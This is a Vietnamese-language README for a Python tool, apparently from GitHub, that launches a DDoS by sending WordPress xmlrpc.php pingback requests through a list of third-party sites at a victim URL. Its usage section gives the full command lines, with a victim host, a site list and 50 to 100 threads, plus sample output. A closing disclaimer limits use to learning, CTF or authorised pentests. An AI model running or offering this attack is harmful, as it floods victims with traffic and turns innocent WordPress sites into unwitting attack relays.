# XML-RPC Pingback DDoS Tool

## 📌 Giới thiệu
Script Python này giúp **tự động gửi request pingback qua xmlrpc.php** để mô phỏng tấn công **DDoS PoC** vào một URL mục tiêu.  
Người dùng cung cấp **file chứa danh sách URL bài viết WordPress**, script sẽ gửi pingback đến target qua các site này.

---

## 🚀 Tính năng
- ✅ Gửi pingback request thông qua xmlrpc.php.  
- ✅ Hỗ trợ chạy đa luồng để tăng tốc độ gửi request.  
- ✅ Tự động phân tích URL từ file input.

---

## 📂 Cấu trúc
```
.
├── pingback_ddos_auto.py   # Script chính
├── wp_sites.txt            # Danh sách URL bài viết WordPress
```

---

## 🔧 Cách sử dụng
### 1️⃣ Chạy script
```bash
python3 pingback_ddos_auto.py --host <victim_url> --file wp_sites.txt --threads 50
```
<img width="769" height="283" alt="image" src="https://github.com/user-attachments/assets/7b474894-b80b-4dc3-9a5a-fc9ec8a1ee7a" />

### 2️⃣ Tham số:
- `--host` → URL của nạn nhân (target của DDoS)  
- `--file` → File chứa danh sách URL bài viết WordPress (mặc định: wp_sites.txt)  
- `--threads` → Số luồng chạy song song (mặc định: 1)

---

## ⚡ Ví dụ chạy:
```bash
python3 pingback_ddos_auto.py --host http://victim.com --file wp_sites.txt --threads 100
[+] Pingback sent from http://site1.com
[-] http://site2.com returned status 403
```

---

## 📌 Ví dụ file `wp_sites.txt`
```
http://example1.com/2025/07/29/sample-post/
http://example2.com/2025/07/22/test-post/
http://example3.com/2025/07/22/blog-article/
```
<img width="1123" height="604" alt="image" src="https://github.com/user-attachments/assets/a96cec60-0928-411f-b154-d3bdde829685" />

---

## ⚠️ Lưu ý
⚠️ Tool chỉ phục vụ **mục đích học tập, nghiên cứu bảo mật, CTF hoặc pentest hợp pháp**.  
⚠️ **Tuyệt đối không sử dụng để tấn công hệ thống khi chưa có sự cho phép.**

---

## 📜 License
MIT License
